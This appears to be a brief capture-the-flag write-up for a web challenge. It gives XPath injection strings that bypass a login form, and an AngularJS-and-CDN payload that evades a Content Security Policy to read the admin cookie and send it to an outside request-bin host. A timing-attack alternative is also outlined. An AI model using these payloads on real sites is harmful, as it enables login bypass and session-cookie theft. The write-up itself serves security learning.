# Quick write up

## Step 1: Access the administration area
A XPath injection is possible in the login form.
One possible solution to exploit it is:
```
Username: ' or '1'='1
Password: ' or '1'='1' and position()<='1
```

## Step 2: Get the super admin cookie
### The intended way
The administration area display userg agent of the frontpage visitors.
You can inject stuff in it but it does not seem te be executed. This is due to
the [Content Security Policy](http://www.w3.org/TR/CSP2/) header.

A quick search finds the write up of a similar challenge: [H5SC Minichallenge 3: "Sh*t, it's CSP!"](https://github.com/cure53/XSSChallengeWiki/wiki/H5SC-Minichallenge-3:-"Sh*t,-it's-CSP!"). We know how to execute code thanks to these insecure CDNs.

Choose a vector in the write up and exploit it. One solution can be:
```html
<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="http://ajax.googleapis.com/ajax/libs/angularjs/1.1.3/angular.min.js"></script><div ng-app ng-csp id=p ng-click="$event.view.console.log($event.view.document.cookie);$event.view.console.log($event.view.jQuery.ajax('http://inspectb.in/413aabba?'+$event.view.document.cookie))"><script async src=//ajax.googleapis.com/jsapi?callback=p.click></script>
```

### The hard way
Exploit a timing attack when the cookie content is compared to get the full cookie.
Some references:
 * [ircmaxell's blog](https://blog.ircmaxell.com/2014/11/its-all-about-time.html)
 * [Crosby, Wallach and Riedi -- Opportunities and Limits of Remote
Timing Attacks](http://www.cs.rice.edu/~dwallach/pub/crosby-timing2009.pdf)
 * [Nanosecond Scale Remote Timing Attacks On PHP Applications: Time To Take Them Seriously?](http://blog.astrumfutura.com/2010/10/nanosecond-scale-remote-timing-attacks-on-php-applications-time-to-take-them-seriously/)

TL;DR: I was near to impossible to attack the application this way accross the Internet.
You could probably pull it off using a VPS in the same datacenter that the one hosting
the challenge.
